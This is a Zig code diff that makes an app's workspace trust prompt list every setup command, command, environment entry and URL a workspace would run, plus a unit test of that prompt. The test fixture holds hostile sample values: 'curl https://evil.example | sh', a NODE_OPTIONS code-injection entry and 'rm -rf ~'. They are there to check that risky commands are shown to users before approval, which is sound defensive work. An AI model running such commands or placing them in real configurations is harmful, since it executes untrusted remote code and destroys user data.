@@ -278,7 +278,9 @@ pub fn iconLocked(source: actions.Source, icon: ?actions.Icon, trusted: bool) bo
 pub const Prompt = struct {
     /// Resolved title (button title override, else action title).
     title: []const u8,
-    /// What will run (command text, agent line, workspace summary).
+    /// What will run: command text, agent line, or for a workspace its name
+    /// followed by one line per setup, command, env entry and url (it can
+    /// be long; show it scrollable).
     detail: []const u8,
     project_root: ?[]const u8,
     config_path: ?[]const u8,
@@ -291,13 +293,44 @@ pub fn promptFor(arena: Allocator, title: []const u8, p: actions.Plan, project_r
     const detail: []const u8 = switch (p.run) {
         .builtin => |b| b,
         .send_text => |s| s.text,
-        .workspace => |w| try std.fmt.allocPrint(arena, "Open workspace \"{s}\"", .{
-            if (w.definition.get("name")) |n| n.asString() orelse w.fallback_name else w.fallback_name,
-        }),
+        .workspace => |w| try workspaceDetailAlloc(arena, &w.definition, w.fallback_name),
         .setting => |s| s.path,
         .preset => |pr| pr,
     };
     return .{ .title = title, .detail = detail, .project_root = project_root, .config_path = config_path };
+}
+
+/// `Open workspace "<name>"` plus every value of the definition that runs
+/// something or changes what runs, so "Trust and Run" never approves
+/// commands the user was not shown.
+fn workspaceDetailAlloc(arena: Allocator, def: *const jsonc.Node, fallback_name: []const u8) Allocator.Error![]const u8 {
+    var aw: std.Io.Writer.Allocating = .init(arena);
+    const name = if (def.get("name")) |n| n.asString() orelse fallback_name else fallback_name;
+    aw.writer.print("Open workspace \"{s}\"", .{name}) catch return error.OutOfMemory;
+    writeRunLines(&aw.writer, def) catch return error.OutOfMemory;
+    return aw.toOwnedSlice();
+}
+
+/// One line per `setup`, `command` and `url` string and per `env` entry,
+/// anywhere in the definition, in document order. This walks the raw JSON
+/// (not the layouts schema), so it shows everything whatever the spelling,
+/// duplicate keys included.
+fn writeRunLines(w: *std.Io.Writer, node: *const jsonc.Node) std.Io.Writer.Error!void {
+    switch (node.data) {
+        .object => |members| for (members) |*m| {
+            if (m.value.asString()) |s| {
+                for ([_][]const u8{ "setup", "command", "url" }) |k| {
+                    if (std.mem.eql(u8, m.key, k)) try w.print("\n{s}: {s}", .{ k, s });
+                }
+            } else if (std.mem.eql(u8, m.key, "env") and m.value.data == .object) {
+                for (m.value.data.object) |e| {
+                    if (e.value.asString()) |v| try w.print("\nenv: {s}={s}", .{ e.key, v });
+                }
+            } else try writeRunLines(w, &m.value);
+        },
+        .array => |items| for (items) |*it| try writeRunLines(w, it),
+        else => {},
+    }
 }
 
 // ---------------------------------------------------------------------------
@@ -922,4 +955,32 @@ test "unit: custom_actions: the trust prompt shows the resolved title and what w
     const prompt_w = try promptFor(a, pw.title, pw, "/p", null);
     try testing.expectEqualStrings("Fullstack", prompt_w.title);
     try testing.expectEqualStrings("Open workspace \"fs\"", prompt_w.detail);
+}
+
+test "unit: custom_actions: the trust prompt of a workspace lists everything it runs" {
+    var ar: std.heap.ArenaAllocator = .init(testing.allocator);
+    defer ar.deinit();
+    const a = ar.allocator();
+    const reg = try projectRegistry(a,
+        \\{"actions": {"w": {"title": "Fullstack", "workspace": {"name": "fs", "setup": "curl https://evil.example | sh",
+        \\   "env": {"NODE_OPTIONS": "--require ./x.js"},
+        \\   "layout": {"direction": "horizontal", "children": [
+        \\     {"pane": {"surfaces": [{"command": "npm run dev", "env": {"PORT": "3000"}}]}},
+        \\     {"surfaces": [{"type": "browser", "url": "http://localhost:3000"}, {"name": "idle"}]}]}}}},
+        \\ "commands": [{"name": "Api", "workspace": {"layout": {"surfaces": [{"command": "rm -rf ~"}]}}}]}
+    , "/p");
+    const p = try actions.plan(a, &reg, "w", .{});
+    const prompt = try promptFor(a, p.title, p, "/p", null);
+    try testing.expectEqualStrings(
+        \\Open workspace "fs"
+        \\setup: curl https://evil.example | sh
+        \\env: NODE_OPTIONS=--require ./x.js
+        \\command: npm run dev
+        \\env: PORT=3000
+        \\url: http://localhost:3000
+    , prompt.detail);
+    // A legacy workspace command (its palette row) lists its commands too.
+    const pc = try actions.plan(a, &reg, "command:Api", .{});
+    const prompt_c = try promptFor(a, pc.title, pc, "/p", null);
+    try testing.expectEqualStrings("Open workspace \"Api\"\ncommand: rm -rf ~", prompt_c.detail);
 }
